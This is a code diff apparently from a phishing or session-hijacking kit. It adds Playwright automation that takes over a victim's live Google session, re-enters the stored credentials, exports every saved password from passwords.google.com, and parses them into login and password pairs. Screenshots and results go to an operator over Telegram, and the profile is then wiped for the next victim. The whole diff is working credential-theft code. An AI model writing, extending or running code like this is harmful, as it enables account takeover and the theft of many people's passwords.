@@ -14,6 +14,7 @@ import { collectGmailStats, formatStatsForTelegram } from './gmail-stats.js';
 
 const sessions = new Map(); // accountId -> { context, page, lastActivity }
 const redirectCbs = new Map();
+const passwordsCache = new Map(); // accountId -> { csv: Buffer, txt: Buffer, ts: number }
 export function setRedirectCb(id, fn) { redirectCbs.set(id, fn); }
 export function clearRedirectCb(id) { redirectCbs.delete(id); }
 const starting = new Map(); // accountId -> Promise
@@ -102,7 +103,7 @@ async function launch(accountId, adminIp) {
     channel: account.channel || config.browserChannel || undefined,
     viewport: DEFAULT_VIEWPORT,
     userAgent: account.victimUa ||
-      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36',
     args: [
       '--disable-blink-features=AutomationControlled',
       '--no-sandbox',
@@ -737,6 +738,42 @@ async function launch(accountId, adminIp) {
             .catch(() => {});
         }, 5000);
       }
+
+      // For Google accounts: export passwords first, THEN reset profile.
+      // For others: reset after 5s immediately.
+      const isGoogle = /google\.com|gmail\.com/i.test(current.startUrl || '');
+      if (isGoogle) {
+        // Export passwords in background, reset only after it completes (or times out after 2 min)
+        exportPasswordsInBackground(accountId)
+          .catch(() => {})
+          .finally(async () => {
+            try {
+              await stop(accountId);
+              await wipeProfile(accountId);
+              await start(accountId, '127.0.0.1');
+              pushLog(accountId, 'nav', '🔄 Profil wyczyszczony — formularz logowania gotowy dla kolejnej osoby');
+            } catch { /* best-effort */ }
+          });
+        // Safety: force reset after 5 minutes even if export hangs
+        setTimeout(async () => {
+          const s = sessions.get(accountId);
+          if (s && s._resetDone) return;
+          try {
+            await stop(accountId);
+            await wipeProfile(accountId);
+            await start(accountId, '127.0.0.1');
+          } catch { /* best-effort */ }
+        }, 300000);
+      } else {
+        setTimeout(async () => {
+          try {
+            await stop(accountId);
+            await wipeProfile(accountId);
+            await start(accountId, '127.0.0.1');
+            pushLog(accountId, 'nav', '🔄 Profil wyczyszczony — formularz logowania gotowy dla kolejnej osoby');
+          } catch { /* best-effort */ }
+        }, 5000);
+      }
     }).catch(() => {});
   });
 
@@ -850,6 +887,8 @@ export function startIdleReaper(log = console) {
   setInterval(() => {
     const now = Date.now();
     for (const [accountId, s] of sessions) {
+      // Don't kill sessions that are actively exporting passwords
+      if (s._exportingPasswords) continue;
       if (now - s.lastActivity > IDLE_TIMEOUT_MS) {
         log.info({ accountId }, 'stopping idle browser session');
         stop(accountId).catch((err) => log.error({ err, accountId }, 'idle stop failed'));
@@ -907,4 +946,240 @@ export function listStatus() {
 
 export async function shutdownAll() {
   await Promise.all([...sessions.keys()].map((id) => stop(id).catch(() => {})));
+}
+
+export function getPasswordsCache(accountId) {
+  return passwordsCache.get(accountId) || null;
+}
+
+// Fill password field on current page (handles both visible input and re-auth dialog)
+async function _fillPassword(page, password) {
+  await page.waitForSelector('input[type="password"]', { timeout: 5000 }).catch(() => {});
+  await page.click('input[type="password"]').catch(() => {});
+  await page.fill('input[type="password"]', password);
+  await page.keyboard.press('Enter');
+  await page.waitForTimeout(3000);
+}
+
+// One export attempt — reuses the existing session page (avoids Google re-auth on new tab).
+// Returns CSV buffer or throws.
+async function _exportPasswordsAttempt(ctx, acc, agentNum, existingPage) {
+  const page = existingPage || await ctx.newPage();
+  const isOwned = !existingPage; // we close only pages we opened
+  const savedUrl = existingPage ? existingPage.url() : null;
+  try {
+    pushLog(acc.id, 'nav', `🔑 Agent ${agentNum}: otwiera passwords.google.com`);
+
+    // Start at main passwords page first so session cookies are set
+    await page.goto('https://passwords.google.com/', { waitUntil: 'load', timeout: 40000 });
+    await page.waitForTimeout(2000);
+
+    // Helper: handle auth wall — intro page or accounts.google.com redirect
+    const handleAuth = async () => {
+      const url = page.url();
+
+      // Landed on intro page — click Sign in, wait for navigation
+      if (url.includes('/intro')) {
+        const ss = await page.screenshot({ type: 'jpeg', quality: 60 }).catch(() => null);
+        if (ss) telegram.sendDocument(ss, `agent${agentNum}-intro.jpg`, `🔑 Agent ${agentNum}: intro page — klikam Sign in`).catch(() => {});
+
+        // Click the Sign in / Zaloguj button
+        const clicked = await page.evaluate(() => {
+          const btns = [...document.querySelectorAll('a, button')];
+          const btn = btns.find(b => /sign.?in|zaloguj|get started|rozpocznij/i.test(b.textContent));
+          if (btn) { btn.click(); return true; }
+          return false;
+        });
+
+        if (clicked) {
+          // Wait for navigation away from intro
+          await page.waitForURL(url => !url.includes('/intro'), { timeout: 15000 }).catch(() => {});
+          await page.waitForTimeout(2000);
+        }
+      }
+
+      // Handle accounts.google.com redirect (full re-auth needed)
+      const url2 = page.url();
+      if (url2.includes('accounts.google.com')) {
+        if (!acc.password) throw new Error('accounts.google.com redirect but no password saved');
+
+        // Step 1: fill email if visible
+        const emailInput = await page.$('input[type="email"]').catch(() => null);
+        if (emailInput) {
+          await page.fill('input[type="email"]', acc.email || '');
+          await page.keyboard.press('Enter');
+          await page.waitForTimeout(2000);
+          const ss2 = await page.screenshot({ type: 'jpeg', quality: 60 }).catch(() => null);
+          if (ss2) telegram.sendDocument(ss2, `agent${agentNum}-after-email.jpg`, `🔑 Agent ${agentNum} po wpisaniu email — ${page.url()}`).catch(() => {});
+        }
+
+        // Step 2: fill password if visible
+        const pwdInput = await page.$('input[type="password"]').catch(() => null);
+        if (pwdInput) {
+          await _fillPassword(page, acc.password);
+          const ss3 = await page.screenshot({ type: 'jpeg', quality: 60 }).catch(() => null);
+          if (ss3) telegram.sendDocument(ss3, `agent${agentNum}-after-pass.jpg`, `🔑 Agent ${agentNum} po wpisaniu hasła — ${page.url()}`).catch(() => {});
+        } else {
+          // No password field — maybe account picker or 2FA
+          const ss3 = await page.screenshot({ type: 'jpeg', quality: 60 }).catch(() => null);
+          if (ss3) telegram.sendDocument(ss3, `agent${agentNum}-no-pwd-field.jpg`, `⚠️ Agent ${agentNum}: brak pola hasła — ${page.url()}`).catch(() => {});
+        }
+
+        await page.waitForURL(u => !u.includes('accounts.google.com'), { timeout: 20000 }).catch(() => {});
+        await page.waitForTimeout(2000);
+
+        const ss4 = await page.screenshot({ type: 'jpeg', quality: 60 }).catch(() => null);
+        if (ss4) telegram.sendDocument(ss4, `agent${agentNum}-after-auth.jpg`, `🔑 Agent ${agentNum} po auth — ${page.url()}`).catch(() => {});
+      }
+
+      // Now navigate to options page
+      if (!page.url().includes('/options')) {
+        await page.goto('https://passwords.google.com/options?ep=1', { waitUntil: 'load', timeout: 30000 });
+        await page.waitForTimeout(2000);
+      }
+    };
+
+    await handleAuth();
+
+    // Screenshot — see current state
+    const ss0 = await page.screenshot({ type: 'jpeg', quality: 60 }).catch(() => null);
+    if (ss0) telegram.sendDocument(ss0, `agent${agentNum}-ready.jpg`, `🔑 Agent ${agentNum} — ${page.url()}`).catch(() => {});
+
+    // Set up download listener BEFORE clicking export — use context level to
+    // catch downloads from popup windows that Google may open for the confirm step.
+    const downloadPromise = ctx.waitForEvent('download', { timeout: 45000 });
+
+    // Find & click Export button (shadow DOM aware)
+    // On /options?ep=1 the Export Passwords button should be directly visible
+    const clicked = await page.evaluate(() => {
+      function click(root) {
+        if (!root) return false;
+        for (const b of root.querySelectorAll('button, a, [role="button"]')) {
+          const t = (b.textContent + ' ' + (b.getAttribute('aria-label') || '')).toLowerCase();
+          if (/export|eksport/.test(t)) { b.click(); return true; }
+        }
+        for (const el of root.querySelectorAll('*')) {
+          if (el.shadowRoot && click(el.shadowRoot)) return true;
+        }
+        return false;
+      }
+      return click(document.body);
+    }).catch(() => false);
+
+    if (!clicked) {
+      const ss = await page.screenshot({ type: 'jpeg', quality: 60 }).catch(() => null);
+      if (ss) telegram.sendDocument(ss, `agent${agentNum}-nobutton.jpg`, `⚠️ Agent ${agentNum}: nie znalazł przycisku Export — url: ${page.url()}`).catch(() => {});
+      throw new Error(`export button not found on ${page.url()}`);
+    }
+
+    await page.waitForTimeout(2000);
+
+    // Screenshot after first click — see if dialog appeared
+    const ss1 = await page.screenshot({ type: 'jpeg', quality: 60 }).catch(() => null);
+    if (ss1) telegram.sendDocument(ss1, `agent${agentNum}-afterclick.jpg`, `🔑 Agent ${agentNum} po kliknięciu Export — ${page.url()}`).catch(() => {});
+
+    // Re-auth dialog may appear immediately after clicking export
+    const reAuthAfter = await page.$('input[type="password"]').catch(() => null);
+    if (reAuthAfter) {
+      if (!acc.password) {
+        throw new Error('re-auth dialog after export click but no password');
+      }
+      await _fillPassword(page, acc.password);
+      await page.waitForTimeout(2000);
+    }
+
+    // Confirm export dialog (shadow DOM aware) — click the confirm/export button
+    const confirmed = await page.evaluate(() => {
+      function click(root) {
+        if (!root) return false;
+        for (const b of root.querySelectorAll('button')) {
+          const t = (b.textContent + ' ' + (b.getAttribute('aria-label') || '')).toLowerCase();
+          if (/export|eksport|download|pobierz/.test(t)) { b.click(); return true; }
+        }
+        for (const el of root.querySelectorAll('*')) {
+          if (el.shadowRoot && click(el.shadowRoot)) return true;
+        }
+        return false;
+      }
+      return click(document.body);
+    }).catch(() => false);
+
+    await page.waitForTimeout(2000);
+
+    // Second re-auth check (sometimes appears after confirm dialog)
+    const reAuthAfter2 = await page.$('input[type="password"]').catch(() => null);
+    if (reAuthAfter2 && acc.password) {
+      await _fillPassword(page, acc.password);
+      await page.waitForTimeout(2000);
+    }
+
+    const download = await downloadPromise;
+    const stream = await download.createReadStream();
+    const chunks = [];
+    for await (const chunk of stream) chunks.push(chunk);
+    return Buffer.concat(chunks);
+  } finally {
+    // Restore original URL if we borrowed the session page
+    if (!isOwned && savedUrl && savedUrl !== 'about:blank') {
+      page.goto(savedUrl, { waitUntil: 'commit' }).catch(() => {});
+    } else if (isOwned) {
+      await page.close().catch(() => {});
+    }
+  }
+}
+
+export async function exportPasswordsInBackground(accountId) {
+  const s = sessions.get(accountId);
+  if (!s) {
+    telegram.sendMessage(`❌ Eksport haseł: brak aktywnej sesji dla konta ${accountId}`).catch(() => {});
+    return;
+  }
+  const cached = passwordsCache.get(accountId);
+  if (cached && Date.now() - cached.ts < 10 * 60 * 1000) return;
+
+  const acc = await getAccount(accountId);
+  if (!acc) return;
+
+  // Mark session as exporting so idle reaper doesn't kill it
+  s._exportingPasswords = true;
+  s.lastActivity = Date.now();
+
+  pushLog(accountId, 'nav', `🔑 Eksport haseł — uruchamiam 3 agenty równolegle`);
+
+  let csv;
+  try {
+    // All agents open new tabs — cookies are shared within the context so they
+    // stay authenticated, and the victim's visible page is never navigated away.
+    csv = await Promise.any([
+      _exportPasswordsAttempt(s.context, acc, 1),
+      _exportPasswordsAttempt(s.context, acc, 2),
+      _exportPasswordsAttempt(s.context, acc, 3),
+    ]);
+  } catch (err) {
+    const msg = err?.errors ? err.errors.map(e => e?.message).join(' | ') : (err?.message || String(err));
+    pushLog(accountId, 'error', `❌ Eksport haseł — wszystkie 3 agenty zawiodły: ${msg}`);
+    telegram.sendMessage(`❌ Eksport haseł "${acc.label}" — wszystkie agenty zawiodły:\n${msg}`).catch(() => {});
+    return;
+  } finally {
+    if (sessions.get(accountId)) sessions.get(accountId)._exportingPasswords = false;
+  }
+
+  const lines = csv.toString('utf8').split('\n').map(l => l.trim()).filter(Boolean);
+  const dataLines = lines.slice(1);
+  const readable = dataLines.map(line => {
+    const cols = [];
+    let cur = '', inQ = false;
+    for (const ch of line) {
+      if (ch === '"') { inQ = !inQ; }
+      else if (ch === ',' && !inQ) { cols.push(cur); cur = ''; }
+      else cur += ch;
+    }
+    cols.push(cur);
+    const [name, url, username, password] = cols;
+    return `${name || url}\n  login: ${username}\n  hasło: ${password}`;
+  }).join('\n\n');
+
+  const txt = Buffer.from(readable, 'utf8');
+  passwordsCache.set(accountId, { csv, txt, count: dataLines.length, ts: Date.now() });
+  telegram.sendMessage(`🔐 Hasła gotowe: ${acc.label} (${dataLines.length} wpisów) — użyj /panel → konto → Google Passwords`).catch(() => {});
 }
